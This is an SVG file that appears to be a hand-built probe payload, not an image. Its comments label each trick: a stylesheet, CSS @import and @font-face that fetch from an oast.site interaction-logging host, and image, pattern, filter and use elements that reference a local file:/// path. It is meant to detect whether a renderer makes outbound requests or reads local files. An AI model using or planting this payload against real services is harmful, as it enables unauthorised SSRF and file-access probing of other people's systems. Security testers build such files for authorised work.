<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/css" href="https://d36rugappb7igk40auvgua47a85yqwpi5.oast.site/xml-stylesheet.css"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="2400" height="2400" viewBox="0 0 100 100">
  <!-- External CSS @import + @font-face fetches -->
  <style>
    @import url("https://d36rugappb7igk40auvgua47a85yqwpi5.oast.site/style-import.css");
    @font-face {
      font-family: trig;
      src: url("https://d36rugappb7igk40auvgua47a85yqwpi5.oast.site/font.woff");
    }
    text { font-family: trig, sans-serif; }
  </style>

  <!-- External image directly (classic) -->
  <image href="file:///C:/Users/salah/downloads/nn.svg" x="0" y="0" width="10" height="10"/>

  <!-- xlink:href variant for older renderers -->
  <image xlink:href="file:///C:/Users/salah/downloads/nn.svg" x="10" y="0" width="10" height="10"/>

  <!-- Pattern that pulls an external image -->
  <defs>
    <pattern id="p" x="0" y="0" width="10" height="10" patternUnits="userSpaceOnUse">
      <image xlink:href="file:///C:/Users/salah/downloads/nn.svg" width="10" height="10"/>
    </pattern>

    <!-- Filter with feImage referencing external URL -->
    <filter id="f">
      <feImage xlink:href="file:///C:/Users/salah/downloads/nn.svg"/>
    </filter>
  </defs>

  <rect x="0" y="20" width="50" height="20" fill="url(#p)"/>
  <rect x="0" y="45" width="50" height="20" filter="url(#f)"/>

  <!-- External symbol via <use> to a remote sprite -->
  <use x="0" y="70" xlink:href="file:///C:/Users/salah/downloads/nn.svg#logo" width="20" height="20"/>

  <!-- Text to encourage font download -->
  <text x="5" y="95" font-size="10">trigger</text>
</svg>
